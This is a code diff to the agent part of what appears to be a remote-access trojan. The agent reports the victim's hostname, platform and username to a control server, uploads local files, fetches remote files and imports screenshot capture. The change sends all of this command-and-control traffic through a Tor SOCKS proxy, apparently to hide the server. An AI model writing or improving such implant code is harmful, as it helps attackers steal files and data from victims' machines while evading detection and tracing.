@@ -16,6 +16,8 @@ import zipfile
 import tempfile
 import socket
 import getpass
+
+
 if os.name == 'nt':
     from PIL import ImageGrab
 elif os.name == 'posix':
@@ -24,6 +26,12 @@ else:
     import pyscreenshot as ImageGrab
 
 import config
+
+s = requests.session()
+s.proxies = {
+    'http':  'socks5h://127.0.0.1:9050',
+    'https': 'socks5h://127.0.0.1:9050'
+}
 
 
 def threaded(func):
@@ -93,7 +101,7 @@ class Agent(object):
 
     def server_hello(self):
         """ Ask server for instructions """
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/hello',
+        req = s.post(config.SERVER + '/api/' + self.uid + '/hello',
             json={'platform': self.platform, 'hostname': self.hostname, 'username': self.username})
         return req.text
 
@@ -105,12 +113,8 @@ class Agent(object):
         if not output:
             return
         if newlines:
-            output = str(output) + "\n\n"
-        try:
-            output = str(output, 'UTF-8')
-        except:
-            pass
-        req = requests.post(config.SERVER + '/api/' + self.uid + '/report',
+            output += "\n\n"
+        req = s.post(config.SERVER + '/api/' + self.uid + '/report',
         data={'output': output})
 
     def expand_path(self, path):
@@ -170,7 +174,7 @@ class Agent(object):
         try:
             if os.path.exists(file) and os.path.isfile(file):
                 self.send_output("[*] Uploading %s..." % file)
-                requests.post(config.SERVER + '/api/' + self.uid + '/upload',
+                s.post(config.SERVER + '/api/' + self.uid + '/upload',
                     files={'uploaded': open(file, 'rb')})
             else:
                 self.send_output('[!] No such file: ' + file)
@@ -185,7 +189,7 @@ class Agent(object):
             if not destination:
                 destination= file.split('/')[-1]
             self.send_output("[*] Downloading %s..." % file)
-            req = requests.get(file, stream=True)
+            req = s.get(file, stream=True)
             with open(destination, 'wb') as f:
                 for chunk in req.iter_content(chunk_size=8000):
                     if chunk:
